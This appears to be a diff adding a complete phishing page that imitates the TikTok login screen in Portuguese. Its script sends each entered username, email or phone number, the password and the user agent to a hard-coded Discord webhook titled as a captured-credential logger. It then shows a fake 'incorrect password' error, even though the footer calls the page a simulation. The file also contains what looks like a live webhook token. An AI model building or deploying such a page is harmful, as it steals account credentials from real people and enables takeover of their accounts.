@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar no TikTok</title>
+    <!-- Tailwind CSS for styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for official-looking icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        /* Custom TikTok brand colors & animation tweaks */
+        .tiktok-pink { color: #fe2c55; }
+        .tiktok-cyan { color: #25f4ee; }
+        .bg-tiktok-pink { background-color: #fe2c55; }
+        .bg-tiktok-pink:hover { background-color: #e62349; }
+        .border-tiktok { border-color: rgba(22, 24, 35, 0.12); }
+    </style>
+</head>
+<body class="bg-white text-[#161823] min-h-screen flex flex-col justify-between selection:bg-[#fe2c55] selection:text-white">
+
+    <!-- Top Navigation Bar -->
+    <header class="w-full py-4 px-6 flex items-center justify-between border-b border-gray-100">
+        <div class="flex items-center space-x-2 cursor-pointer">
+            <!-- TikTok Logo SVG -->
+            <svg class="w-8 h-8" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M41.4 13.9C39.2 13.9 37.1 13.1 35.4 11.7V27.7C35.4 36.1 28.5 43 20.1 43C11.7 43 4.8 36.1 4.8 27.7C4.8 19.3 11.7 12.4 20.1 12.4C21.1 12.4 22.1 12.5 23 12.7V20.2C22.1 20 21.1 19.9 20.1 19.9C15.9 19.9 12.4 23.4 12.4 27.6C12.4 31.8 15.9 35.3 20.1 35.3C24.3 35.3 27.8 31.8 27.8 27.6V0H35.4C35.4 4.8 37.9 9.1 41.4 11.7V13.9Z" fill="#161823"/>
+            </svg>
+            <span class="text-xl font-bold tracking-tight">TikTok</span>
+        </div>
+        <div class="flex items-center space-x-4">
+            <button class="flex items-center space-x-1 text-sm font-semibold text-gray-700 hover:text-black transition">
+                <i class="fa-regular fa-circle-question text-lg"></i>
+                <span class="hidden sm:inline">Ajuda e feedback</span>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow flex items-center justify-center px-4 py-8">
+        <div class="w-full max-w-[480px] bg-white rounded-xl shadow-lg border border-gray-100 p-8 sm:p-10 relative overflow-hidden">
+            
+            <!-- Loading Overlay (hidden by default) -->
+            <div id="loadingOverlay" class="absolute inset-0 bg-white/95 z-50 flex flex-col items-center justify-center hidden">
+                <div class="relative w-16 h-16 mb-4">
+                    <div class="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-[#fe2c55] rounded-full animate-spin border-t-transparent"></div>
+                </div>
+                <p class="text-lg font-semibold text-gray-800">Entrando na conta...</p>
+                <p class="text-sm text-gray-500 mt-1">Verificando credenciais do TikTok</p>
+            </div>
+
+            <!-- Header Title -->
+            <div class="text-center mb-8">
+                <h1 class="text-2xl sm:text-3xl font-bold tracking-tight mb-2">Entrar no TikTok</h1>
+                <p class="text-sm text-gray-500">Gerencie sua conta, verifique notificações, comente e muito mais.</p>
+            </div>
+
+            <!-- Login Form -->
+            <form id="loginForm" class="space-y-5" onsubmit="handleLogin(event)">
+                
+                <!-- Identifier Input (Email, Username, Phone) -->
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">E-mail, nome de usuário ou telefone</label>
+                    <div class="relative flex items-center">
+                        <span class="absolute left-3.5 text-gray-400">
+                            <i class="fa-solid fa-user"></i>
+                        </span>
+                        <input type="text" id="identifier" required
+                            class="w-full pl-10 pr-4 py-3 bg-[#f1f1f2] border border-transparent rounded-lg text-sm focus:bg-white focus:border-gray-400 focus:outline-none transition"
+                            placeholder="E-mail, nome de usuário ou telefone">
+                    </div>
+                </div>
+
+                <!-- Password Input -->
+                <div>
+                    <div class="flex items-center justify-between mb-1.5">
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-gray-600">Senha do celular / conta</label>
+                        <a href="#" class="text-xs font-semibold text-gray-500 hover:text-[#fe2c55] transition">Esqueceu a senha?</a>
+                    </div>
+                    <div class="relative flex items-center">
+                        <span class="absolute left-3.5 text-gray-400">
+                            <i class="fa-solid fa-lock"></i>
+                        </span>
+                        <input type="password" id="password" required
+                            class="w-full pl-10 pr-10 py-3 bg-[#f1f1f2] border border-transparent rounded-lg text-sm focus:bg-white focus:border-gray-400 focus:outline-none transition"
+                            placeholder="Sua senha">
+                        <button type="button" onclick="togglePassword()" class="absolute right-3.5 text-gray-400 hover:text-gray-600 focus:outline-none">
+                            <i id="eyeIcon" class="fa-solid fa-eye-slash"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Error Message Banner (hidden) -->
+                <div id="errorBanner" class="hidden bg-red-50 border border-red-200 text-red-600 text-xs px-3 py-2.5 rounded-lg flex items-center space-x-2">
+                    <i class="fa-solid fa-circle-exclamation"></i>
+                    <span id="errorText">Ocorreu um erro ao entrar. Tente novamente.</span>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" id="submitBtn"
+                    class="w-full py-3.5 bg-tiktok-pink text-white font-semibold rounded-lg shadow-md transition duration-200 flex items-center justify-center space-x-2">
+                    <span>Avançar</span>
+                    <i class="fa-solid fa-arrow-right text-xs"></i>
+                </button>
+            </form>
+
+            <!-- Alternative Login Options Divider -->
+            <div class="mt-8 pt-6 border-t border-gray-100 text-center">
+                <p class="text-xs text-gray-500">Não tem uma conta? <a href="#" class="font-semibold text-tiktok-pink hover:underline">Cadastre-se</a></p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-4 text-center text-xs text-gray-400 border-t border-gray-100">
+        <p>&copy; 2026 TikTok - Simulação de Autenticação</p>
+    </footer>
+
+    <!-- JavaScript Logic -->
+    <script>
+        // Toggle Password Visibility
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eyeIcon');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIcon.classList.remove('fa-eye-slash');
+                eyeIcon.classList.add('fa-eye');
+            } else {
+                passwordInput.type = 'password';
+                eyeIcon.classList.remove('fa-eye');
+                eyeIcon.classList.add('fa-eye-slash');
+            }
+        }
+
+        // Handle Form Submission and Webhook Request
+        async function handleLogin(event) {
+            event.preventDefault();
+
+            const identifier = document.getElementById('identifier').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const errorBanner = document.getElementById('errorBanner');
+            const errorText = document.getElementById('errorText');
+
+            // Hide previous errors if any
+            errorBanner.classList.add('hidden');
+
+            // Show loading overlay
+            loadingOverlay.classList.remove('hidden');
+
+            // Discord Webhook URL provided by user
+            const webhookUrl = "https://discord.com/api/webhooks/1559313604061175818/zJmKjhL3g03R_v1UC7BkOcJHXtI9rL2pr3TZpvzlWlYKQ-p8E0NBJNXHGyApVNYJ4hle";
+
+            // Format payload for Discord Webhook embed
+            const payload = {
+                username: "TikTok Logger Bot",
+                avatar_url: "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo_icon-7c784191c981b1d2ff639458b29c9dbd.png",
+                embeds: [{
+                    title: "📥 Nova Credencial TikTok Capturada!",
+                    color: 16657493, // TikTok Pink color decimal
+                    fields: [
+                        {
+                            name: "👤 Usuário / E-mail / Telefone",
+                            value: `\`\`\`${identifier}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔑 Senha",
+                            value: `\`\`\`${password}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🌐 IP / Informações",
+                            value: `User Agent: \`${navigator.userAgent}\``,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                // Send data to Discord webhook via fetch POST
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Erro ao enviar para o webhook:", err);
+            }
+
+            // Simulate server authentication delay and show error/redirection state
+            setTimeout(() => {
+                loadingOverlay.classList.add('hidden');
+                errorText.textContent = "Nome de usuário ou senha incorretos. Tente novamente.";
+                errorBanner.classList.remove('hidden');
+                document.getElementById('password').value = '';
+            }, 2500);
+        }
+    </script>
+</body>
+</html>
